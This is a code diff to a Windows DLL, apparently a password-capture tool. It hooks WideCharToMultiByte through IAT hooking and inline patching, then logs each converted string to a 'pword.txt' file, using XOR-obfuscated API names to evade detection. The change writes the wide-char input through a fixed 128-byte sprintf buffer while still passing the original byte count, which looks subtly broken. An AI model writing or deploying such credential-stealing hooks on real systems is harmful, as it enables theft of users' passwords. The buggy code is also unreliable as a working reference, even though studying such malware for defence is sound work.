@@ -1,5 +1,7 @@
 #include <Windows.h>
 
+#include <stdio.h>
+
 #define UTILS_IMPLEMENTATION
 #include "../utils.h"
 
@@ -13,7 +15,9 @@ int HookedWideCharToMultiByteIAT(UINT CodePage, DWORD dwFlags, LPCWCH lpWideChar
     HANDLE hFile = pCreateFileA("C:\\Users\\someone\\pword.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile != INVALID_HANDLE_VALUE)
     {
-        pWriteFile(hFile, lpMultiByteStr, iBytesWritten, NULL, NULL);
+        char str[128];
+        sprintf(str, "%ws\n", lpWideCharStr);
+        pWriteFile(hFile, str, iBytesWritten, NULL, NULL);
         pCloseHandle(hFile);
     }
 
@@ -32,7 +36,9 @@ int HookedWideCharToMultiByteInlinePatch(UINT CodePage, DWORD dwFlags, LPCWCH lp
     HANDLE hFile = pCreateFileA("C:\\Users\\someone\\pword.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile != INVALID_HANDLE_VALUE)
     {
-        pWriteFile(hFile, lpMultiByteStr, iBytesWritten, NULL, NULL);
+        char str[128];
+        sprintf(str, "%ws\n", lpWideCharStr);
+        pWriteFile(hFile, str, iBytesWritten, NULL, NULL);
         pCloseHandle(hFile);
     }
 
@@ -47,7 +53,7 @@ __declspec(dllexport) int HookIAT()
         goto shutdown;
     }
 
-    PopulateKernelFunctionPtrsByOrdinal(hKernel);
+    PopulateKernelFunctionPtrsByName(hKernel);
 
     char cWideCharToMultiByte[] = {0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0};
     MyXor(cWideCharToMultiByte, 19, key, 5);
@@ -132,7 +138,7 @@ __declspec(dllexport) int HookInlinePatch()
         goto shutdown;
     }
 
-    PopulateKernelFunctionPtrsByOrdinal(hKernel);
+    PopulateKernelFunctionPtrsByName(hKernel);
     char cWideCharToMultiByte[] = {0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0};
     MyXor(cWideCharToMultiByte, 19, key, 5);
 
@@ -167,7 +173,7 @@ BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved)
     switch (dwReason)
     {
     case DLL_PROCESS_ATTACH:
-        // HookInlinePatch((FARPROC)HookedWideCharToMultiByte);
+        // HookInlinePatch();
         // HookIAT();
         break;
 
